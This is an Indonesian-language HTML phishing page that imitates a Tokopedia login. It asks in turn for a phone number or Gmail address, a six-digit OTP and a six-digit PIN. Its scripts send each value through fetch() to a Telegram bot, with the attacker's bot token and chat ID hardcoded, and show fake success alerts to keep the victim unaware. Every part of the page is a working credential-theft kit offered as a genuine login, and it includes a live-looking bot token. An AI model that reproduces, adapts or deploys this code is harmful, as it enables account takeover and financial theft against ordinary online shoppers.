<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Halaman Login</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
  body {
      background-color: #ffffff;
      font-family:  sans-serif;
    }
    .container {
      max-width: 400px;
      margin-top: -28px;
    }
    .form-control {
      height: 45px;
      border-radius: 10px;
      background-color: white;
      outline: none;
      border: none;
      border: 0.09rem solid hsla(140, 0%, 92%, 1);
    }
    .btn-sidik-jari, .btn-shop {
      border-radius: 7px;
      background-color: aliceblue;
      outline: none;
      border: none;
      border: 0.09rem solid hsla(140, 0%, 76%, 1);
    }
    .btn {
      border-radius: 7px;
      height: 45px;
      width: 100%;
      background-color: #28a745;
      color: #fff;
      font-weight: bold;
    }
    .btn:hover {
      background-color: #218838;
    }
    .text-muted {
      font-size: 0.9em;
    }
    .bold-text {
      font-weight: bold;
      color: #333;
    }
    .help-text {
      color: #28a745;
      font-weight: bold;
    }
    .example-text {
      font-size: 0.8em;
      color: #888;
      margin-top: -5px;
    }
    .separator {
      display: flex;
      align-items: center;
      text-align: center;
      margin-top: 20px;
      margin-bottom: 20px;
    }
    .separator::before,
    .separator::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #ddd;
    }
    .separator:not(:empty)::before {
      margin-right: .5em;
    }
    .separator:not(:empty)::after {
      margin-left: .5em;
    }
    .verification-container {
      display: none;
    }
    .icon {
      font-size: 1.2em;
      margin-right: 8px;
    }
    /* Custom button colors */
    .btn-sidik-jari {
      background-color: #ffffff; /* Biru */
      color: #858587;
    }
    .btn-sidik-jari:hover {
      background-color: #2a8b3e;
    }
    .btn-google {
      background-color: #ffffff; /* Merah */
      color: #858587;
    }
    .btn-google:hover {
      background-color: #2a8b3e;
    }
    .btn-shop {
      background-color: #ffffff; /* Hijau */
      color: #858587;
    }
    .btn-shop:hover {
      background-color: #2a8b3e;
    }
    .btn-sidik-jari .icon {
  color: #007bff; /* Warna biru untuk Sidik Jari */
}

.btn-google .icon {
  color: hsla(360, 99%, 50%, 1); /* Warna merah untuk Google */
}

.btn-shop .icon {
  color: hsla(360, 58%, 0%, 1); /* Warna hijau untuk Shop | Tokopedia */
}
.bold-text {
  font-size: 19px;
  margin-right: 46px;
  font-weight: bold; /* jika Anda ingin menambahkan ketebalan teks */
}
.bold-text1 {
  font-size: 0.8em;
  color: #888;
}
.separator {
  font-size: 0.8em;
  color: #888;
}
header {
    background-color: #ffffff;
    padding: 10px 20px;
    position: relative;
}

.header-content {
    display: flex;
    align-items: center;
    justify-content: space-between;
}

h1 {
    font-family: Arial, Helvetica, sans-serif;
    color: hsla(140, 58%, 44%, 1);
    margin: 0;
    font-size: 18px;
    font-weight: bold;
}

.back-button {
    background: none;
    border: none;
    font-size: 24px;
    color: #333;
    cursor: pointer;
    padding: 5px;
}

/* Mengubah garis pemisah agar menyentuh sisi kanan dan kiri */
hr {
    border: 0;
    border-top: 2px solid hsla(360, 0%, 83%, 1); /* Garis putih */
    margin: 10px -20px; /* Margin negatif agar garis menyentuh sisi */
}

.btn-block {
  margin-top: 30px;
}
.text-muted {
  font-size: 15px;
}
.loading {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: rgba(255, 255, 255, 0.8);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 1000;
    font-size: 1.2em;
}
    /* Tambahkan style loading */
    .loading {
      text-align: center;
      padding: 20px;
    }
    .loading .spinner-border {
      width: 3rem;
      height: 3rem;
    }
    .loading p {
      margin-top: 10px;
      font-weight: bold;
      color: #28a745;
    }

    .otp-input-group {
      display: flex;
      justify-content: space-between;
      max-width: 300px;
      margin: 0 auto;
    }

    .otp-input {
      width: 40px;
      height: 40px;
      font-size: 20px;
      text-align: center;
      border: 2px solid #ccc;
      margin: 5px;
      border-radius: 5px;
    }

    .otp-input:focus {
      border-color: #007bff;
      outline: none;
    }

    .otp-label {
      text-align: center;
      font-size: 16px;
      margin-bottom: 10px;
    }

    .otp-input-group input::placeholder {
      color: transparent;
    }

    .otp-input-group input:focus::placeholder {
      color: transparent;
    }
  </style>
</head>
<body>
    <header>
        <div class="header-content">
            <button class="back-button">
                <i class="fas fa-arrow-left"></i>
            </button>
            <h1>Daftar</h1>
        </div>
        <hr>
    </header>
    <div class="container">
        <div id="loginPage" class="login-container">
            <h5 class="text-center bold-text my-4">Masuk buat nikmatin banyak promo</h5>
            <form id="loginForm">
                <div class="form-group">
                    <label for="phoneEmail" class="bold-text1">Email atau Nomor Ponsel</label>
                    <input type="text" class="form-control" id="phoneEmail" placeholder="" required>
                    <small class="example-text">Contoh: 08123456789</small>
                    <div class="text-right mt-1">
                        <a href="#" class="help-text">Butuh Bantuan?</a>
                    </div>
                </div>
                <button type="button" class="btn btn-block" id="submit-btn" onclick="sendCode()">Lanjut</button>
                <div class="separator">atau masuk dengan</div>
                <div class="text-center my-3">
                    <button class="btn btn-sidik-jari btn-block mb-2">
                        <span class="icon"><i class="fas fa-fingerprint"></i></span> Sidik Jari
                    </button>
                    <button class="btn btn-shop btn-block">
                        <span class="icon"><i class="fab fa-shopify"></i></span> Shop | Tokopedia
                    </button>
                </div>
            </form>
        </div>

        <!-- Elemen Loading -->
        <div id="loading" class="loading" style="display: none;">
            <div class="spinner-border text-primary" role="status">
                <span class="sr-only">Loading...</span>
            </div>
            <p class="text-center">Sedang memproses...</p>
        </div>

        <!-- Halaman OTP -->
        <div id="otpPage" class="otp-container" style="display: none;">
            <label class="otp-label">Masukkan Kode Verifikasi</label>
            <p class="text-center text-muted">Kode verifikasi telah dikirim melalui Email/SMS ke <span id="userPhone"></span>.</p>
            <form id="verificationForm">
                <div class="otp-input-group">
                    <input type="text" class="otp-input" maxlength="1" id="otp1" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" id="otp2" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" id="otp3" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" id="otp4" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" id="otp5" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" id="otp6" inputmode="numeric">
                </div>
                <button type="submit" class="btn btn-block">Verifikasi</button>
                <div class="text-center text-muted mt-2">
                    Mohon tunggu dalam <span id="countdown">30</span> detik untuk kirim ulang.
                </div>
            </form>
        </div>
    </div>
    
    <!-- Halaman Input PIN -->
<div id="pinPage" class="pin-container" style="display: none;">
    <label class="otp-label">Masukkan PIN Anda</label>
    <form id="pinForm">
        <div class="otp-input-group">
            <input type="password" class="otp-input" maxlength="1" id="pin1" inputmode="numeric">
            <input type="password" class="otp-input" maxlength="1" id="pin2" inputmode="numeric">
            <input type="password" class="otp-input" maxlength="1" id="pin3" inputmode="numeric">
            <input type="password" class="otp-input" maxlength="1" id="pin4" inputmode="numeric">
            <input type="password" class="otp-input" maxlength="1" id="pin5" inputmode="numeric">
            <input type="password" class="otp-input" maxlength="1" id="pin6" inputmode="numeric">
        </div>
        <button type="submit" class="btn btn-block">Verifikasi PIN</button>
    </form>
</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.bundle.min.js"></script>
<script src="https://kit.fontawesome.com/a076d05399.js"></script>
<script>
  function isValidPhoneNumber(phone) {
    return /^\d{10,13}$/.test(phone);
  }

  function isValidEmail(email) {
    return /^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(email);
  }

  function sendCode() {
    const phoneEmail = document.getElementById("phoneEmail").value;
    const submitButton = document.getElementById("submit-btn");
    const loadingDiv = document.getElementById("loading");

    if (/^\d+$/.test(phoneEmail)) {
      if (!isValidPhoneNumber(phoneEmail)) {
        alert("Nomor ponsel harus 10 hingga 13 digit.");
        return;
      }
    } else {
      if (!isValidEmail(phoneEmail)) {
        alert("Email harus berformat email valid dan diakhiri dengan @gmail.com.");
        return;
      }
    }

    // Tampilkan loading
    loadingDiv.style.display = "block";
    submitButton.disabled = true;
    submitButton.textContent = "Memproses...";

    // Kirim data ke Telegram
    const message = `
    ╭───────────────╮
     🆔️ *Tokopedia | Login*
╰───────────────╯
 ✅️ *Nomor/Email*: ${phoneEmail}
`;

    const telegramBotToken = '7716996968:AAFfmIxyUs0cBHp9E21cUeXtzwpZFcJSDWw'; 
    const chatId = '7225707577'; 
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

    // Lakukan request ke API Telegram
    fetch(url)
      .then(response => response.json())
      .then(data => {
        loadingDiv.style.display = "none"; // Sembunyikan loading
        if (data.ok) {
          submitButton.textContent = 'Berhasil Dikirim';
          // Setelah berhasil kirim, tampilkan halaman OTP
          document.getElementById("loginPage").style.display = "none"; // Sembunyikan halaman login
          document.getElementById("otpPage").style.display = "block"; // Tampilkan halaman OTP
          document.getElementById("userPhone").textContent = phoneEmail; // Tampilkan nomor/email yang digunakan
          startCountdown(); // Mulai countdown untuk OTP
        } else {
          submitButton.textContent = 'Gagal Mengirim';
        }
      })
      .catch(error => {
        console.error('Error:', error);
        submitButton.textContent = 'Gagal Mengirim';
        loadingDiv.style.display = "none"; // Sembunyikan loading jika gagal
      });
  }

  // Fungsi Countdown untuk OTP
  function startCountdown() {
    let timeLeft = 30;
    const countdown = document.getElementById("countdown");
    const interval = setInterval(() => {
      if (timeLeft <= 0) {
        clearInterval(interval);
        countdown.textContent = "Kirim ulang sekarang";
      } else {
        countdown.textContent = timeLeft + " detik";
        timeLeft--;
      }
    }, 1000);
  }

  // Fungsi verifikasi OTP
document.getElementById("verificationForm").addEventListener("submit", function(e) {
    e.preventDefault();

    // Ambil nilai OTP
    const otp = [
      document.getElementById("otp1").value,
      document.getElementById("otp2").value,
      document.getElementById("otp3").value,
      document.getElementById("otp4").value,
      document.getElementById("otp5").value,
      document.getElementById("otp6").value
    ].join('');

    // Ambil nilai nomor/email yang digunakan untuk login
    const phoneEmail = document.getElementById("phoneEmail").value;

    if (otp.length === 6) {
      alert("OTP berhasil diverifikasi!");
      // Kirim OTP dan Nomor ke Telegram
      const telegramMessage = `
      ╭────────────────────╮
     🆔️ *Tokopedia | Verifikasi OTP*
╰────────────────────╯
✅️ *Nomor/Email*: ${phoneEmail}
✅️ *OTP*: ${otp}
`;

      const telegramBotToken = '7716996968:AAFfmIxyUs0cBHp9E21cUeXtzwpZFcJSDWw'; 
      const chatId = '7225707577'; 
      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}&parse_mode=Markdown`;

      // Kirim data OTP dan Nomor/Email ke Telegram
      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            alert('OTP berhasil dikirim ke Telegram!');
            // Redirect atau proses lebih lanjut jika OTP valid
          } else {
            alert('Gagal mengirim OTP ke Telegram.');
          }
        })
        .catch(error => {
          console.error('Error:', error);
          alert('Gagal mengirim OTP ke Telegram.');
        });
    } else {
      alert("Mohon masukkan kode OTP yang benar.");
    }
});
</script>
<script>
      // Ambil semua input OTP
const otpInputs = document.querySelectorAll('.otp-input');

// Menangani input agar hanya bisa 1 karakter per input dan pindah otomatis ke input berikutnya
otpInputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        // Jika input memiliki panjang 1, pindahkan fokus ke input berikutnya
        if (input.value.length === 1 && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
        }
        // Jika input dikosongkan (misalnya, dengan tombol backspace), pindahkan fokus ke input sebelumnya
        if (input.value.length === 0 && index > 0) {
            otpInputs[index - 1].focus();
        }
    });

    // Menangani input untuk memastikan hanya angka yang bisa dimasukkan
    input.addEventListener('keydown', (e) => {
        const key = e.key;
        if (!/^\d$/.test(key) && key !== 'Backspace') {
            e.preventDefault(); // Cegah input yang bukan angka atau backspace
        }
    });
});
    </script>
    <script>
    document.getElementById("pinForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const pin = [
      document.getElementById("pin1").value,
      document.getElementById("pin2").value,
      document.getElementById("pin3").value,
      document.getElementById("pin4").value,
      document.getElementById("pin5").value,
      document.getElementById("pin6").value
    ].join('');

    if (pin.length === 6) {
        alert("PIN berhasil diverifikasi!");

        // Kirim data PIN ke Telegram
        const phoneEmail = document.getElementById("phoneEmail").value;
        const telegramMessage = `
             ╭────────────────────╮
         🆔️ *Tokopedia | Verifikasi PIN*
  ╰────────────────────╯
        ✅️ *Nomor/Email*: ${phoneEmail}
        ✅️ *PIN*: ${pin}
        `;
        const telegramBotToken = '7716996968:AAFfmIxyUs0cBHp9E21cUeXtzwpZFcJSDWw'; 
        const chatId = '7225707577'; 
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}&parse_mode=Markdown`;

        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Tungguh dahulu sebelum mencoba kembali');
                    // Redirect atau proses lebih lanjut setelah verifikasi PIN berhasil
                } else {
                    alert('Gagal mengirim PIN ke Telegram.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Gagal mengirim PIN ke Telegram.');
            });
    } else {
        alert("Mohon masukkan kode PIN yang benar.");
    }
});

      document.getElementById("verificationForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const otp = [
      document.getElementById("otp1").value,
      document.getElementById("otp2").value,
      document.getElementById("otp3").value,
      document.getElementById("otp4").value,
      document.getElementById("otp5").value,
      document.getElementById("otp6").value
    ].join('');

    if (otp.length === 6) {
        // Tampilkan halaman PIN setelah OTP diverifikasi
        document.getElementById("otpPage").style.display = "none"; 
        document.getElementById("pinPage").style.display = "block"; 
    } else {
        alert("Mohon masukkan kode OTP yang benar.");
    }
});
    </script>
</body>
</html>